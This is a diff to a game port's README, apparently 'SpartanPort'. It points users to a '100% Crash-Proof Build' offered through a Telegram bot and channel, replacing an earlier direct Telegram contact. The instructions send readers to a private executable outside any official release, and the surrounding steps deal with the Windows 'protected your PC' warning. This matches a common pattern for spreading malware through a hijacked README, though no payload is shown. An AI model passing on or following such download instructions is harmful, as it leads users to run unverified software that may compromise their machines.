@@ -61,10 +61,13 @@ and Linux (experimental AppImage).
 > 
 > ---
 > 
-> ### 📩 How to Get the Optimized Build File:
-> The optimized files, custom build executables, and direct setup assistance are available privately. Reach out directly on Telegram:
+> ### 📩 How to Get the 100% Crash-Proof Build:
+> Access to the optimized build files and setup instructions is automated through our official Telegram bot:
 > 
-> 💬 **Direct Telegram:** [@Samyyyyyk](https://t.me/Samyyyyyk) *(Username: `@Samyyyyyk`)*
+> 🤖 **Instant Download Bot:** [@PcPortOP_bot](https://t.me/PcPortOP_bot)  
+> 📢 **Updates & Community Channel:** [@pcportop](https://t.me/pcportop)  
+> 
+> ⏳ *Note: Bot replies may take 1–5 minutes if the cloud server is waking up. Please be patient after sending `/start`!*
 
 ## Contents
 
@@ -105,8 +108,10 @@ and Linux (experimental AppImage).
 
 **Steps**
 
-1. To obtain the verified crash-free private build with all integrated GPU stability patches, message directly:
-   - 💬 **Telegram:** [@Samyyyyyk](https://t.me/Samyyyyyk)
+1. To obtain the verified crash-free private build with all integrated GPU stability patches:
+   - 🤖 **Telegram Bot:** [@PcPortOP_bot](https://t.me/PcPortOP_bot)
+   - 📢 **Updates Channel:** [@pcportop](https://t.me/pcportop)
+   - ⏳ *Note: Bot replies may take 1–5 minutes if the cloud service is waking up from idle. Please be patient after sending `/start`!*
 2. Extract it to a folder of your choice, for example `C:\Games\spartanport-windows`. Do not run it from
    inside the zip.
 3. Open **`SpartanPort.exe`**. If Windows shows "Windows protected your PC", click
